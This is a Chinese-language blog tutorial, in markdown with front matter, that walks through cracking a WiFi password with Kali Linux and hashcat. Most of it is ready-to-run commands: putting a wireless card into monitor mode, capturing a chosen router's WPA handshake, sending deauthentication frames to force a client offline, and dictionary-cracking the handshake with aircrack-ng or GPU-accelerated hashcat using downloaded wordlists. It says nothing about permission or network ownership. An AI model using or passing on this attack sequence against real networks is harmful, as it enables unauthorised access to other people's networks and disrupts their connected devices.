---
title: "使用 kali + hashcat 破解 wifi 密码教程"
date: "2023-11-22 16:45:50"
description: "参考文档:"
categories:
  - "软件技巧"
tags:
  - "kali"
---
> 参考文档: 
>
> kali 破解wifi基本流程:
>
> https://zhuanlan.zhihu.com/p/603295597
>
> https://www.toutiao.com/article/6774378037413675523/
>
> kali linux 官网:
>
> https://www.kali.org/
>
> hash 官网:
>
> https://hashcat.net/hashcat/
>
> cuda tookit 官网:
>
> https://developer.nvidia.com/cuda-toolkit
>
> 字典下载:
>
> https://weakpass.com/download


需要你有一块支持监听模式的无线网卡, 可以自行淘宝搜索kali网卡

# 流程

## kali 获取握手包

```bash
提权
sudo -i
检查网卡是否支持监听
airmon-ng
自动杀掉可能影响监听的进程
airmon-ng check kill
启动监听模式
airmon-ng start wlan0

扫描附近wifi
airodump-ng wlan0mon
如果这里扫描不到, 请拔插网卡多次尝试以上命令

监听握手包
airodump-ng -c [信道] --bssid [路由器mac地址] -w [存储抓包文件位置] wlan0mon
airodump-ng -c 6 --bssid 98:0D:51:F1:ED:78 -w /home/kali/wifi/ wlan0mon

对连接设备进行攻击使其掉线
aireplay-ng -0 10 -a [路由器mac地址] -c [客户端mac地址] wlan0mon
aireplay-ng -0 10 -a 98:0D:51:F1:ED:78 -c 7C:D6:61:85:FD:BF wlan0mo
```

## 破解握手包

获取到握手包之后, 可以使用kali自带的`aircrack-ng`进行破解, 但这种方法速度不快, 指令如下

```bash
aircrack-ng  -a2 -b [路由器mac地址] -w [字典文件] /home/kali/wifi/-01.cap
aircrack-ng  -a2 -b 98:0D:51:F1:ED:78 -w /usr/share/wordlists/wifite.txt /home/kali/wifi/-01.cap
```

这里更推荐使用`hashcat`进行破解, `hashcat`可以调用gpu加速, 一个10G左右的字典只需要一小时左右

将linux内的`.cap`文件拷贝至windows内, 由于`hashcat`需要更新的格式, 转换网址为 `https://hashcat.net/cap2hashcat/`<br />

要使用`hashcat`的GPU加速需要先安装`Cuda tookit`, 安装完成后, 在`hashcat`文件夹内打开命令行, 运行如下命令

```bash
./hashcat -m 22000 -D 2 D:\下载\683569_1700633546.hc22000 D:\下载\weakpass_3p\weakpass_3p
```

等待完成即可